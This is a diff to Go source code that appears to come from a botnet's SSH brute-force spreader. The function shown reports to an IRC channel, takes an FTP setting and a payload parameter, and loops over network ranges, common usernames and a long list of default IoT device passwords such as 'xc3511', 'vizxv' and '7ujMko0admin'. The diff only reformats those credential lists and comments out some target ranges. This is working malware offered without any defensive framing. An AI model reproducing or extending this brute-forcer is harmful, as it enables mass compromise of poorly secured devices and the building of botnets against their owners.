@@ -118,8 +118,9 @@ func SSH_Session(ssh_session *ssh.Client, command string) {
 
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetArr := []string{
-		chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
-		cgpn4, cgpn5, cgpn6, priv,
+		//chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
+		//cgpn4, cgpn5, cgpn6, priv,
+		priv,
 	}
 
 	/*
@@ -127,21 +128,15 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"admin", "root", "guest", //admin, root, guest
-		"user", "support", "login", //user, support, login
+		"admin", "root", "user", "guest", "support", "login",
 	}
 
 	passList := []string{
-		"", "root", "admin", "123456", //no-password, root, admin, 123456
-		"888888", "default", "54321", "password", //888888, default, 54321, password
-		"1111", "1111111", "1234", "12345", //1111, 1111111, 1234, 12345
-		"pass", "xc3511", "vizxv", "xmhdipc", //pass, xc3511, vizxv, xmhdipc
-		"juantech", "user", "admin1234", "666666", //juantech, user, admin1234, 666666
-		"klv123", "klv1234", "Zte521", "hi3518", //klv123, klv1234, Zte521, hi3518
-		"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", //jvbzd, 7ujMko0vizxv, 7ujMko0admin, ikwb
-		"system", "realtek", "00000000", "smcadmin", //system", realtek, 00000000, smcadmin
-		"123456789", "12345678", "111111", "123123", //123456789, 12345678, 111111, 123123
-		"1234567890", "login", "supoort", "guest", //1234567890, login, supoort, guest
+		"", "root", "admin", "123456", "888888", "default", "54321", "password",
+		"1111", "1111111", "1234", "12345", "pass", "xc3511", "vizxv", "xmhdipc",
+		"juantech", "user", "admin1234", "666666", "klv123", "klv1234", "Zte521", "hi3518",
+		"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", "system", "realtek", "00000000", "smcadmin",
+		"123456789", "12345678", "111111", "123123", "1234567890", "login", "supoort", "guest",
 	}
 
 	for {
